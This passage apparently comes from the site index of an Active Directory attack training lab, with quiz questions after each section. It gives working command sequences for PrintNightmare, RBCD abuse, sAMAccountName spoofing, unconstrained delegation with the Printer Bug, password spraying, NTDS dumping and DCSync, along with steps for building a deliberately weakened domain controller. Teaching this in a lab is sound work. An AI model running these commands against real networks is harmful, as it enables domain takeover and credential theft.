the Print Spooler service will be abused. This service used to allow users to upload their own printer drivers to enable easy network printer sharing. A printer driver is a software component that basically acts as a translator between computers and printers. These drivers could be uploaded by users to machines running the Print Spooler service, and the dangerous part is that the Print Spooler service runs as SYSTEM. Meaning that printer drivers are run as SYSTEM as well.</p> <p>An attacker could then upload mallicious code disguised as a printer driver to a machine running the vulnerable service. </p> <p>The Print Spooler service runs on DCs by default. An attacker can then potentially upload a printer driver that creates a new user and adds this user to the local administrators group. And as simple as that, the attacker would then have administrative privileges on the DC itself.</p> <p>To execute this attack, we can first assess if CAPTAIN provides the Print Spooler service: <pre><code>crackmapexec smb 192.168.122.10 -M spooler\n</code></pre></p> <p>Lucky for us, the CAPTAIN DC does provide the vulnerable service. Now, create a file named 'pnightmare.c' inside the 'pnightmare' directory, with the contents seen in pnightmare.c. This code will create a user called 'printersplitter' with password 'Passw0rd' and add the user to the local administrators group.</p> <p>Now, compile the code, start an SMB share so that the DC can retrieve the driver, and finally trigger the DC to retrieve the driver: <pre><code>x86_64-w64-mingw32-gcc -shared -o pnightmare.dll pnightmare.c\nsudo -E python3 /home/ubuntu/.local/bin/smbserver.py -smb2support ATTACKERSHARE . &amp; \n#press ENTER\npython3 CVE-2021-1675.py polaris.local/skyler.white:'Password123'@captain.polaris.local '\\\\192.168.122.2\\ATTACKERSHARE\\pnightmare.dll'\n</code></pre></p> <p>Now the attacker holds new administrative credentials, and can use them to dump domain user's hashes, for example, compromising every single user account: <pre><code>crackmapexec smb captain.polaris.local -u printersplitter -p 'Passw0rd' --ntds\n</code></pre></p> <p>Question</p> <p>Which Windows service is being targetted by the PrintNightmare attack?</p> Answer <p>The Print Spooler service, namely, the fact that it allowed users to upload arbitrary printer drivers.</p> <p>Question</p> <p>Under which security context can attacker code be executed through this attack?</p> Answer <p>Through the PrintNightmare attack, an attacker can execute code under the SYSTEM security context.</p> <p>Question</p> <p>Which method from the Spooler service does the attacker use to upload this arbitrary driver to the DC?</p> Answer <p>RpcAddPrinterDriverEx is abused to make the DC retrieve and install a malicious driver DLL from the attacker\u2019s SMB share.</p>"},{"location":"labs/single-domain-attacks/RBCDAbuse/","title":"RBCD Abuse","text":"<p>We've seen how both unconstrained and constrained delegation can be abused in this guide. Misconfigured Resource-Based Constrained Delegation can also be abused. Misconfigurations include allowing a low-privileged user to hold delegation rights to sensitive services, much like what happens in the Constrained Delegation Abuse section.</p> <p>Let's take a look at which delegation rights are set in the domain, and see if some low-privileged user can delegate tickets to sensitive services: <pre><code>findDelegation.py POLARIS.ALTAIR.LOCAL/skyler.white:Password123 -target-domain polaris.local\n</code></pre></p> <p>We see that saul.goodman can delegate tickets to any service hosted by MEMBER. This means that the user can impersonate any other user while accessing this server, through means of the S4U2User and S4U2Proxy extensions. Fortunately for us, we've been able to retrieve this user's credentials from its own user account description attribute that the user forgot to delete. Now, we can use Saul's credentials and access the MEMBER CIFS service as the administrator, for example, compromising the MEMBER machine.</p> <pre><code>#retrieve a ticket for the CIFS service in member as the administrator\ngetST.py -spn 'CIFS/member' -impersonate Administrator -dc-ip '192.168.122.10' 'polaris.local/saul.goodman:beTTer2caLL2me'\n#set the krb5ccname environment var to the new ccache file\nexport KRB5CCNAME=/home/ubuntu/Administrator.ccache\n#use the ticket to access the domain controller through a shell as the administrator\nwmiexec.py -k -no-pass polaris.local/administrator@member\n#now you've gained access to the MEMBER machine and can execute commands through the CIFS service\nwhoami\n</code></pre> <p>Question</p> <p>What is the risk of misconfigured RBCD?</p> Answer <p>If a low-privileged account is granted delegation rights to a sensitive machine, it can abuse Kerberos extensions (S4U2Self + S4U2Proxy) to impersonate any user, including domain administrators, when authenticating to that machine, and access any service. This effectively lets the attacker gain privileged access without needing the admin\u2019s password or hash.</p> <p>Question</p> <p>Which is the most granular type of delegation between Constrained and RBCD?</p> Answer <p>Constrained delegation is more granular, since in CD, an administrator determines to which specific services a service can delegate tickets to. In RBCD, a service account defines which other accounts can delegate tickets to it. The service account may host many different services, and RBCD allows delegation to any of these, while CD would only allow delegation to specific services.</p>"},{"location":"labs/single-domain-attacks/SAMAccountNameSpoofing/","title":"SAMAccountNameSpoofing","text":"<p>This attack revolves around tricking the KDC into thinking an account different from the DC is actually the DC account. This way, an attacker can impersonate a DC in a S4U2Self Kerberos extension and retrieve highly privileged service tickets for any DC service.</p> <p>To perpetrate this attack, one must use previously retrieved user credentials, and this user must be able to create a computer account. Users can create up to 10 computer accounts in AD by default. The attacker can check how much computer accounts they can create using CME: <pre><code>crackmapexec ldap captain.polaris.local -u skyler.white -p Password123 -d polaris.local -M MAQ\n</code></pre> It seems that Skyler can create up to 10 computer accounts. Let's create a new one: <pre><code>addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host captain.polaris.local -domain-netbios POLARIS 'polaris.local/skyler.white:Password123'\n</code></pre> Now, the attacker has access to this new account as well. Each account can modify its own SPNs. In this attack, it's necessary to clear out every SPN associated with the newly created account before changing its name: <pre><code>#in the krbrelayx dir\npython3 addspn.py --clear -t 'samaccountname$' -u 'polaris.local\\skyler.white' -p 'Password123' 'captain.polaris.local'\n</code></pre></p> <p>Now, we'll rename the computer account's name to the DC's computer account name, without a trailing '$'. Then, we'll retrieve a TGT that will reference this new name. Once we get the TGT we'll change the computer account name back to its original:</p> <pre><code>#in the samaccountname_scripts dir\npython3 ./renameMachine.py -current-name 'samaccountname$' -new-name 'CAPTAIN' -dc-ip 'captain.polaris.local' polaris.local/skyler.white:Password123\ngetTGT.py -dc-ip 'captain.polaris.local' 'polaris.local'/'CAPTAIN':'ComputerPassword'\npython3 ./renameMachine.py -current-name 'CAPTAIN' -new-name 'samaccountname$' -dc-ip 'captain.polaris.local' polaris.local/skyler.white:Password123\n</code></pre> <p>Now, the attacker can use this TGT and confuse the KDC into believing that the TGT actually belongs to the DC computer account. The attacker can then impersonate the DC in order to obtain a service ticket to a DC service as any user. The attacker will then retrieve a service ticket to the SMB service for the administrator user, and then use this ticket to compromise the domain through a DCSync attack using the secretsdump.py script.</p> <pre><code>export KRB5CCNAME=/home/ubuntu/samaccountname_scripts/CAPTAIN.ccache\npython3 ./getST.py -self -impersonate 'administrator' -altservice 'CIFS/captain.polaris.local' -k -no-pass -dc-ip 'captain.polaris.local' 'polaris.local'/'CAPTAIN'\n#now we have a service ticket impersonating the administrator to the DC's SMB service. At this point the domain can be compromised\nexport KRB5CCNAME=/home/ubuntu/samaccountname_scripts/administrator@CIFS_captain.polaris.local@POLARIS.LOCAL.ccache\nsecretsdump.py -k -no-pass -just-dc -dc-ip 'captain.polaris.local' @'captain.polaris.local'\n</code></pre> <p>Question</p> <p>How can the attacker retrieve a service ticket to the DC's SMB service as the Administrator? Through what mechanism?</p> Answer <p>The attacker retrieves this ticket using the S4U2Self mechanism, which the DC account is allowed to perform. The attacker makes the KDC believe that it holds a TGT pertaining to the DC, and thus it is eligible to execute the S4U2Self and retrieve a service ticket to a DC service, while impersonating the administrator.</p> <p>Question</p> <p>How did the attacker tricked the KDC into believing that the TGT that the attacker holds actually pertains to the DC?</p> Answer <p>By first changing a owned computer account name to CAPTAIN (without a '$' at the end). Asking for a TGT, which will reference the CAPTAIN account, and then changing the account name back to the original. Finally, use the TGT, and since there's no CAPTAIN account, the KDC believes the TGT actually belongs to CAPTAIN$, which is the DC's computer account.</p>"},{"location":"labs/single-domain-attacks/dc-configuration/","title":"Domain Controller configuration","text":"<p>The installation and configuration of the DC involves several steps:</p> <ol> <li>Configure the IP addresses and domain name</li> <li>Rename the server</li> <li>Adjust the clock</li> <li>Install the Active Directory</li> <li>Configure DNS</li> <li>Configure users</li> <li>Install and configure IIS</li> <li>Install and configure DHCP</li> <li>Disable SMB signing</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#configure-the-ip-addresses-and-domain-name","title":"Configure the IP addresses and domain name","text":"<p>Before configuring the IP addresses, you must learn what is the subnet where the NAT cloud is operating. One way of learning is to start the attacker and check the IP address, subnet mask, and gateway it gets from the NAT DHCP server (e.g., using <code>ip add</code> and <code>ip route</code>). In our case, the subnet is <code>198.168.122.0/24</code>, and the gateway is <code>198.168.122.1</code>. Then, the following actions must be performed:</p> <ol> <li>Under <code>Server Manager \u2192 Local Server \u2192 Properties</code> click on the <code>Ethernet</code> link, then on the <code>Ethernet</code> adapter, and finally click <code>Properties \u2192 IPv4</code>.</li> <li>At this window enter <code>IP address</code> as 192.168.122.10, <code>subnet mask</code> as 255.255.255.0, <code>default gateway</code> as 192.168.122.1, and <code>DNS servers</code> as 192.168.122.10 and 8.8.8.8.</li> <li>Click <code>Advanced</code>, select the <code>DNS</code> tab, and in the box <code>DNS suffix for this connection</code> write polaris.local.</li> <li>Apply all the changes and return to the <code>Server Manager</code> window.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#rename-the-server","title":"Rename the server","text":"<ol> <li>Change the name of the server to DC1. This can be done in the <code>Control Panel</code> under <code>System</code>. Restart the computer to apply the changes.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#adjust-the-clock","title":"Adjust the clock","text":"<ol> <li>Make sure that the time zone, the date, and the time are correctly set. The time zone must be set to UTC. The date and time must be close to the attacker\u2019s one. The easiest way is to make the adjustments in the Control Panel.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#install-the-active-directory","title":"Install the Active Directory","text":"<ol> <li>In the <code>Server Manager</code>, click <code>Manage \u2192 Add Roles and features</code>, then click <code>Next</code> until reaching the <code>Server Roles</code> tab.</li> <li>Check the <code>Active Directory Domain Services</code> box, click <code>Add features</code> and click <code>Next</code> until the <code>Confirmation</code> tab appears. At this tab click <code>Install</code>.</li> <li>After the installation, click <code>Promote this server to a domain controller</code>.</li> <li>Select <code>Add a new forest</code> and write polaris.local in the <code>Root Domain name</code> box. Then click <code>Next</code>.</li> <li>Enter the password for the DSRM administrator account. Then click <code>Next</code> until the <code>Prerequisites</code> tab appears and click on <code>Install</code>.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#configure-dns","title":"Configure DNS","text":"<ol> <li>Go back to the IP address configuration window and reconfigure the <code>DNS servers</code> as 192.168.122.10 and 8.8.8.8. Apply the changes and return to the <code>Server Manager</code> window.</li> <li>Click <code>Tools \u2192 DNS \u2192 DC1</code>.</li> <li>Right-click on <code>Reverse Lookup Zones</code>, then click <code>New Zone \u2192 Next \u2192 Primary zone \u2192 Next</code> and select <code>To all DNS servers running... in this forest: polaris.local</code>.</li> <li>Click <code>Next \u2192 IPv4 Reverse Lookup Zone \u2192 Next</code>. In <code>NetworkID</code> box enter 192.168.122. Then click <code>Next \u2192 Next \u2192 Finish</code>. A new entry should have appeared in the <code>Reverse Lookup Zones</code> tab.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#configure-users","title":"Configure users","text":"<p>To configure one user, in the <code>Server Manager</code> click <code>Tools \u2192 Active Directory Users and Computers \u2192 Action \u2192 New \u2192 User</code>. Then, enter the user credentials. Uncheck the option <code>User must change password at next logon</code>. You must create four users with different characteristics, as indicated in the next table.</p> User logon name Password Domain Description darlene.alderson M00npie polaris.local Account with an associated SPN leslie.romero RGFyayBBcm15 polaris.local Password in description leon Password123 polaris.local Weak password angela.moss Jogging1988 polaris.local Kerberos pre-authentication disabled admin Passw0rd polaris.local Administrator account <ol> <li>User angela.moss must be configured with the pre-authentication disabled. To do that access the user <code>Properties</code> (e.g., double-click over the username in the <code>Active Directory Users and Computers</code> window) and in the <code>Account tab \u2192 Account options</code> box check <code>Do not require Kerberos preauthentication</code>.</li> <li>User leslie.romero must be configured with a password in the description. In the <code>General tab \u2192 Description</code> box write <code>DELETE THIS LATER! Password: RGFyayBBcm15</code>.</li> <li>The account of darlene.alderson must have an associated SPN. To perform this configuration, click <code>Tools \u2192 ADSI Edit \u2192 Action \u2192 Connect</code>. Then in <code>DC=polaris,DC=local \u2192 CN=Users</code> search for <code>CN=darlene alderson</code>. Right-click on this CN, select <code>Properties</code> and in the <code>Attribute Editor</code> tab search for <code>servicePrincipalName</code>. Select the attribute, click <code>Edit</code> and insert <code>http/polaris.local:80</code> in the <code>Value to add</code> box.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#install-and-configure-iis","title":"Install and configure IIS","text":"<ol> <li>In the <code>Server Manager</code>, click <code>Manage \u2192 Add Roles and features</code>, then click <code>Next</code> until reaching the <code>Server Roles</code> tab.</li> <li>Check the <code>Web Server(IIS)</code> box, click <code>Add features</code> and click <code>Next</code> until reaching the <code>Role Services</code> tab.</li> <li>Check the <code>Windows Authentication</code> box which is one of the <code>Security</code> options. Then click <code>Next</code> until the <code>Confirmation</code> tab appears. At this tab click <code>Install</code>.</li> <li>Click <code>Tools \u2192 Internet Information Services (IIS) Manager</code>, on the left window open <code>DC1 (Polaris\\Administrator)</code> and then <code>Sites</code>, click above <code>Default Web Site</code>, on the center window double-click over Authentication. Here disable Anonymous Authentication and enable Windows Authentication.</li> <li>On the right window open <code>Providers</code> and make sure that <code>Negotiate</code> is above <code>NTLM</code>. This ensures that Kerberos is selected first as the authentication method, and NTLM is used if Kerberos fails.</li> <li>On the left window select <code>Application Pools</code>, on the center window click over <code>DefaultAppPool</code>, and on the right window open <code>Advanced Settings</code>. Confirm that the <code>Identity</code> attribute is set to <code>ApplicationPoolIdentity</code>.</li> <li>On the left window select <code>Default Web Site</code>, and on the center window double-click over <code>Configuration Editor</code>. Then, in the dropdown menu select <code>system.webServer \u2192 security \u2192 authentication \u2192 windowsAuthentication</code>. Here, set <code>useAppPoolCredentials</code> to <code>False</code> and <code>useKernelMode</code> to <code>True</code>.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#install-and-configure-dhcp","title":"Install and configure DHCP","text":"<ol> <li>In the <code>Server Manager</code>, click <code>Manage \u2192 Add Roles and features</code>, then click <code>Next</code> until reaching the <code>Server Roles</code> tab.</li> <li>Check the <code>DHCP Server</code> box, click <code>Add features</code> and click <code>Next</code> until the <code>Confirmation</code> tab appears. At this tab click <code>Install</code>. This completes the installation of the DHCP server.</li> <li>To configure the DHCP server click <code>Tools \u2192 DHCP</code>, on the left window open <code>dc1.polaris.local</code>, right-click <code>IPv4</code>, and select <code>New Scope</code>. In the <code>Scope Name</code> window give a name to the scope, in the <code>IP Address Range</code> window configure the <code>start IP address</code>, the <code>end IP address</code>, and the subnet mask of the DHCP range (we suggest <code>192.168.122.1</code>, <code>192.168.122.254</code>, and <code>255.255.255.0</code>), in the <code>Add Exclusion and Delay</code> window exclude an IP address range to be used by attackers (we suggest <code>192.168.122.15 to 192.168.122.20</code>), in the <code>Configure DHCP Options</code> window select <code>Yes, I want to configure these options now</code>, in the <code>Router (Default Gateway)</code> window configure the IP address of the default gateway (<code>192.168.122.1</code>), in the <code>Domain Name and DNS Servers</code> window configure the parent domain as <code>polaris.local</code>, and the IP addresses of the DNS servers as <code>192.168.122.10</code> and <code>8.8.8.8</code>. Finally, in the <code>Activate Scope</code> window select <code>Yes, I want to activate this scope now</code>, click <code>Next \u2192 Finish</code>. At this point the corresponding Scope folder is added to the IPv4 section.</li> </ol>"},{"location":"labs/single-domain-attacks/dc-configuration/#disable-smb-signing","title":"Disable SMB signing","text":"<p>(Only required for the SMB relay attack)</p> <p>To disable the SMB signing you will have to change the Registry. In the <code>Server Manager</code>, click on <code>Tools \u2192 Registry Editor</code> and set to <code>0</code> the following attributes:</p> <ul> <li><code>RequireSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters</code></li> <li><code>EnableSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters</code></li> <li><code>RequireSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters</code></li> <li><code>EnableSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters</code></li> </ul>"},{"location":"labs/single-domain-attacks/lab-setup/","title":"Lab setup","text":"<p>The lab experiments will be performed using GNS3. The network scenario for the single-domain environment experiments is shown in Figure 1. </p> <p></p> <p>CAPTAIN and MEMBER are both custom Windows Server 2016 appliances. These appliances are pre-configured for receiving commands through Ansible. You can choose between using Windows appliances with GUI (heavier on resources), or without a GUI (lighter on resources). The lab's Ansible script is expecting you to have GUIs on either all machines or none of them.</p> <p>Choose the .zip file containing the files required for your case. If you choose to use GUIs on Windows machines, download ADLab-SingleDomain-GUI.zip. If you choose to not have GUIs on Windows machines, download ADLab-SingleDomain-NoGUI.zip. You can download the zip file below.</p> <p>Now, to import the GNS3 .qcow2 files to be used as GNS3 templates, do the following: </p> <ul> <li>Open GNS3</li> <li>Go to Edit -&gt; Preferences -&gt; Qemu VMs</li> <li>Press \"New\"</li> <li>The Name of the template must be given according to the GUI choice. If you opted for the no GUI option, the name must be \"custom_windows_NoGUI\". If you opted for the GUI option, the name must be \"custom_windows\". Do not give a different name to the template.</li> <li>Leave the RAM and Qemu binary fields as is.</li> <li>Set the console type to \"vnc\".</li> <li>In the Disk Image menu, pick \"New Image\".</li> <li>Press \"Browse\" and navigate to the respecive .qcow2 file that you can find in the previsouly mentioned zip file. In this case, if you've opted for no GUI, the file is \"windows_server_2016_NoGUI_AnsibleReady_flat.qcow2\". Otherwise the correct file is \"windows_server_2016_GUI_AnsibleReady_flat.qcow2\".</li> <li>Press \"Finish\"</li> </ul> <p>The Orchestrator machine is a docker container. To retrieve this container into a GNS3 template:</p> <ul> <li>Open GNS3</li> <li>In GNS3, go to Edit -&gt; Preferences -&gt; Docker Containers</li> <li>Press \"New\"</li> <li>Select \"Existing image\" and in \"Image Name\" write: \"buzz115/orchestrator:latest\".</li> <li>Confirm the template name is \"buzz115-orchestrator\".</li> <li>Press \"Next\" on every screen and \"Finish\" at the end, keeping default values throughout the rest of the configuration.</li> </ul> <p>Orchestrator contains different Ansible scripts that will be used to setup the lab environment automatically.</p> <p>The Attacker machine is an Ubuntu Cloud Guest appliance. To retrieve it:</p> <ul> <li>Press \"Browse End Devices\", on the left menu (The button that looks like a monitor).</li> <li>Then, press \"New Template\".</li> <li>Choose \"Install an appliance from the GNS3 server (recommended)\", and click \"Next\".</li> <li>Open the \"Guests\" menu. Pick \"Ubuntu Cloud Guest\". Press \"Install\".</li> <li>Choose the server type and the Qemu binary accordingly.</li> <li>Install \"Ubuntu Cloud Guest version Ubuntu 22.04 LTS (Jammy Jellyfish)\"</li> <li>Name the template \"Ubuntu Cloud Guest Ubuntu 22.04 LTS (Jammy Jellyfish)\" exactly.</li> </ul> <p>The Attacker2 machine is a \"Toolbox\" appliance. To retrieve it, follow the same steps presented for the Attacker machine, but instead of choosing \"Ubuntu Cloud Guest\" in the \"Guests\" menu, choose \"Toolbox\". The template must have the name \"Toolbox\".</p> <p>Before proceeding, make sure you:</p> <ul> <li>Have the custom Windows 2016 image available as a GNS3 Template named \"custom_windows_NoGUI\"/\"custom_windows\". Pick the correct name according to your GUI preference. The template name must have one of these values, otherwise the script that builds the lab will fail.</li> <li>Have the custom docker container available as a GNS3 Template named \"buzz115-orchestrator\". The template name must have this value.</li> <li>Have the Toolbox available as a GNS3 Template named \"Toolbox\". The template name must have this value.</li> <li>Have the specified Ubuntu Cloud Guest image available as a GNS3 Template named \"Ubuntu Cloud Guest Ubuntu 22.04 LTS (Jammy Jellyfish)\". The template name must have this value.</li> </ul> <p>Once the templates are correctly imported to GNS3, run the \"CreateADLab.py\" script, also available in the zip file you've downloaded. Both python files extracted from the zip must be in the same directory. <pre><code>usage: CreateADLab.py [-h] --project PROJECT [--path PATH] [--server-path SERVER_PATH] (--no-gui | --gui) (--single-domain | --multi-domain)\n\n#for a lab with Windows GUIs installed on the machines, run:\npython3 CreateADLab.py --project MyADProject --gui --single-domain\n\n#for a lab without Windows GUIs installed on the machines, run:\npython3 CreateADLab.py --project MyADProject --no-gui --single-domain\n</code></pre></p> <p>This script will create the GN3 Lab with the required nodes and links. Once the project is created, open it. Start all devices. Once all devices are turned on, access the Orchestrator machine. At the terminal, head to the respective ansible directory. There are four ansible directories: </p> <ul> <li>One for the multi-domain environment and no GUIs</li> <li>One for the multi-domain environment with GUIs</li> <li>One for the single-domain environment with GUIs</li> <li>And one for the single-domain environment without GUIs</li> </ul> <p>Choose the one you wish to use, which in this case, must be a dir referring to the single-domain environment. Pick the one that uses GUIs or not, depending on your choice.</p> <p>Once in the dir, run: <pre><code>ansible-playbook create_lab.yml\n</code></pre></p> <p>And now, Orchestrator will use an Ansible script to configure the lab's machines (CAPTAIN, MEMBER, and Attacker). This will take some time. Once the script finishes without errors, the environmnet is ready. Have fun.</p> <p>AUTOMATION REMARKS</p> <p>When machines are deployed in the lab, they are given a random IP address from the 192.168.122.0/24. These addresses can sometimes cause a conflict in automation. For example, the MEMBER machine has the 192.168.122.2 IP address given by DHCP set in the NAT node from GNS3. Then, the Ansible script will set 192.168.122.2 to the Attacker machine, and once it tries to connect to the MEMBER at the same IP, the connection can fail.</p> <p>In these cases, if you have some Ansible errors related with connections, that might be the culprit. If you find yourself in this situation, my suggestion is to delete the current project, execute the Python script again, and run Ansible. Most of the times you won't get this problem, but it can happen.</p>"},{"location":"labs/single-domain-attacks/password-spraying-rv/","title":"Password Spraying","text":"<p>Once you know a few usernames, you can start guessing their passwords. The file valid_users.txt, available in the course materials folder, lists the valid users found in the previous exercise. While performing a Wireshark capture, run the following command to check if any valid user has the password: \"Password123\". <pre><code>./kerbrute passwordspray -d polaris.local valid_users.txt --dc 192.168.122.10 Password123\n</code></pre></p> <p>You can also try to guess multiple passwords using Kerbrute. In this case, you'll have to create a file with multiple passwords. These passwords will then be sprayed against the valid user names, from the valid_users.txt. You can use the existing passwords.txt file.</p> <pre><code>./kerbrute passwordspray -d polaris.local valid_users.txt --dc 192.168.122.10 passwords.txt\n</code></pre> <p>Question</p> <p>Explain the process of password spraying performed by kerbrute, using a Wireshark capture.</p> <p>Question</p> <p>Is there any advantage in password spraying a group of known user names, when compared to bruteforcing the password of a single user account? Why?</p> Is there any advantage in password spraying a group of known user names, when compared to bruteforcing the password of a single user account? Why? <p> Submit <p></p></p>"},{"location":"labs/single-domain-attacks/password-spraying/","title":"Password spraying","text":"<p>Once an attacker has uncovered some valid usernames from domains through user enumeration or anonymous SAMR enumeration attacks, they can shift their focus into uncovering passwords.</p> <p>One way of doing so is through a Password Spraying attack, in which a single password is attempted using different valid usernames, a technique useful for preventing account lockouts when compared with traditional bruteforce attacks. To execute this attack on the polaris domain, you can make use of the polaris_users.txt file, containing polaris domain's user names. Using this file you may execute the password spray attack using the Kerbrute tool:</p> <pre><code>./kerbrute passwordspray -d polaris.local polaris_users.txt --dc 192.168.122.10 Password123\n</code></pre> <p>By having valid usernames and trying common passwords, an attacker may gather credentials to access the domain as an authenticated user. This way, the attacker has retrieved one user account password, having now the possibility of authenticating and accessing new information.</p> <p>Question</p> <p>How does this attack prevent account lockout when compared with traditional bruteforce attacks?</p> Answer <p>This attack prevents account lockouts when compared to traditional bruteforce attacks because it targets many user accounts with a single password per attempt, instead of trying many passwords on one user. In traditional bruteforce, repeatedly guessing passwords for the same account quickly triggers lockouts. In contrast, password spraying spreads login attempts across users, which avoids triggering lockout policies while still allowing the attacker to find weak passwords and gain access.</p>"},{"location":"labs/single-domain-attacks/unconstrained-delegation-abuse/","title":"Unconstrained delegation abuse","text":"<p>This attack is performed by using a compromised service account that is configured to perform unconstrained delegation. Once an attacker has compromised any user account, it can query the domain's database using LDAP, in order to check which accounts are configured for delegation. This can be done by using the 'findDelegation.py' script from Impacket. You may use Jesse Pinkman's credentials, cracked in the AS-REP roasting attack.  </p> <pre><code>findDelegation.py POLARIS.LOCAL/jesse.pinkman:Wang0Tang0! -target-domain polaris.local\n</code></pre> <p>The output from the script tells the attacker which accounts are configured for which type of delegation. Namely, the attacker notes that the jesse.pinkman account is configured for unconstrained delegation. This means that through the use of this account, the attacker can retrieve TGTs from users that authenticate to it.</p> <p>Now, the objective in this exercise is to steal the DC account's TGT. The DC account can be coerced into authenticating to the attacker's machine through the use of the Printer Bug. If the DC authenticates to the attacker machine, the attacker can then retrieve its TGT, and impersonate the DC to any service on the domain.</p> <p>To properly trigger the Printer Bug and coerce the DC to authenticate to the attacker using Kerberos, there must be a DNS record that resolves the jesse.pinkman.polaris.local hostname to the attacker's IP address. This is required since if IP addresses are used to trigger authentication, Windows falls back to NTLM. To create this record, the 'dnstool.py' script from the krbrelayx toolkit can be used, since authenticated users can create  DNS records. In the 'krbrelayx' directory, run:</p> <pre><code>python3 dnstool.py -u polaris\\\\jesse.pinkman -p 'Wang0Tang0!' captain.polaris.local --zone polaris.local -r jesse.pinkman.polaris.local -a add -t A -d 192.168.122.2\n</code></pre> <p>At this point, there's a DNS record resolving Jesse's hostname to the attacker's IP address. Upon DC authentication to Jesse, the DC will query DNS and be tricked into thinking that the attacker's IP is actually Jesse's IP.</p> <p>At this point, the printer bug can be executed, which will trigger Kerberos authentication from the DC to the attacker. Since the DC assesses that Jesse is configured for unconstrained delegation, it will include its own TGT within the AP-REQ sent to the attacker's machine. The attacker will then use Jesse's password to decrypt the AP-REQ section that includes a session key. This session key is necessary to use the TGT, and will also be sent to Jesse, as per unconstrained delegation behavior. Once this session key is obtained, the attacker can then use the DC's TGT arbitrarily.</p> <p>To do so, in one terminal, the 'krbrelayx.py' script must be running. Once that script is running and waiting for the DC to authenticate to the attacker, the attacker will execute the printer bug in a second terminal, using the 'printerbug.py' script. The Printer Bug will coerce the DC to authenticate to the attacker's machine.</p> <pre><code>#In a first terminal, run the krbrelayx.py script. To be able to do so, you must stop the DNS service running on your machine\n#First, stop DNS service\nsystemctl stop systemd-resolved \n#Now, run the krbrelayx script\nsudo -E python3 krbrelayx.py -s jesse.pinkman -p Wang0Tang0!\n#Now in a second terminal, run the printer bug in order to trick the DC into authenticating to the attacker using Kerberos\npython3 printerbug.py POLARIS/jesse.pinkman:'Wang0Tang0!'@captain.polaris.local jesse.pinkman.polaris.local\n#At this point you can restart the DNS service\nsystemctl start systemd-resolved \n</code></pre> <p>At this point, the attacker has successfully retrieved the CAPTAIN DCs own TGT, which can be used to impersonate the DC to any service in the domain.</p> <p>Question</p> <p>Why is the service's (Jesse's) password required to retrieve the DC's TGT? </p> Answer <p>The service password is required since in Kerberos Unconstrained Delegation, the DC's TGT is sent to the attacker, along with a session key. This session key is encrypted using the service account's (Jesse) password. Using Jesse's password, the attacker can retrieve this session key and use it in new TGS exchanges, leveraging the own DC's TGT, and therefore impersonating the DC. </p> <p>Question</p> <p>Would the DC send its TGT to the attacker if constrained delegation was used, instead of unconstrained delegation?</p> Answer <p>The DC would not send its TGT if instead constrained delegation was used. This only happens in unconstrained delegation and is considered unsecure.</p> <p>Question</p> <p>Which Windows service is exploited by the Printer Bug to trigger authentication from a target system?</p> Answer <p>The Printer Bug abuses the Windows Print Spooler service to coerce a target to authenticate to the attacker.</p>"},{"location":"labs/single-domain-attacks/user-enumeration-rv/","title":"User enumeration","text":"<p>This exercise resorts to kerbrute and a list of popular usernames, to obtain the usernames configured at the DC (valid usernames). Use the polaris_users.txt file stored in the course materials folder as the list of popular usernames. Run the following command while performing a Wireshark capture at the attacker\u2019s interface: <pre><code>./kerbrute userenum -d polaris.local users.txt --dc 192.168.122.10\n</code></pre> You may use a kerberos filter to analyze the Wireshark capture.</p> <p>Question</p> <p>Explain the user enumeration process, using a Wireshark capture.</p> Answer <p>The attacker sent nine AS-REQ messages over UDP, since there are nine usernames in the users.txt file. Received five PRINCIPAL UNKNOWN error messages, three PREAUTH REQUIRED, and one RESPONSE_TOO_BIG. The latter is due to user angela.moss with does not require pre-authentication. In this case, a TCP connection is established with the AD, the AS-REQ is sent again, and an AS-REP is received. The AS-REP message carries the username of the requesting user. The correlation between requests and responses in the UDP messages is done through the port number. </p> <p>Question</p> <p>How does kerbrute correlate the requests with the responses?</p> <p>Question</p> <p>What is the behavior in case of users not requiring pre-authentication?</p>"},{"location":"labs/single-domain-attacks/user-enumeration/","title":"User enumeration","text":"<p>At this point, we've uncovered polaris.local's user accounts anonymously in the AD Reconnaissance section of the lab. In that same section it is mentioned that DCs don't allow this behavior by default, and in those cases, attackers may leverage the User Enumeration attack in order to find valid user accounts. In this section, we'll perform the User Enumeration attack, as if polaris' users are yet to be uncovered.</p> <p>This exercise resorts to the Kerbrute tool and a list of popular usernames to obtain the usernames configured at the DCs (valid usernames). Use the potential_users.txt as the list of popular usernames. Run the following command while performing a Wireshark capture at the attacker\u2019s interface: <pre><code>./kerbrute userenum -d polaris.local potential_users.txt --dc 192.168.122.10\n</code></pre></p> <p>It seems that we've uncovered 3 usernames in polaris.local through the User Enumeration attack. Nice! Other usernames seem to not have been found, which doesn't mean there are no more users. It means we couldn't guess them...</p> <p>You may use a kerberos filter to analyze the Wireshark capture.</p> <p>Question</p> <p>Explain the user enumeration process, using a Wireshark capture.</p> Answer <p>The attacker sent 11 AS-REQ messages over UDP, since there are 11 usernames in the potential_users.txt file. Received 8 PRINCIPAL UNKNOWN error messages, and 3 PREAUTH REQUIRED. This means that 8 of the 11 usernames do not exist in polaris.local, while 3 of them do.</p> <p>Question</p> <p>How does kerbrute correlate the requests with the responses?</p> Answer <p>Kerbrute correlates each AS-REP response to its username by sending one request per UDP source port, allowing it to match replies based on the unique port used per query.</p>"}]}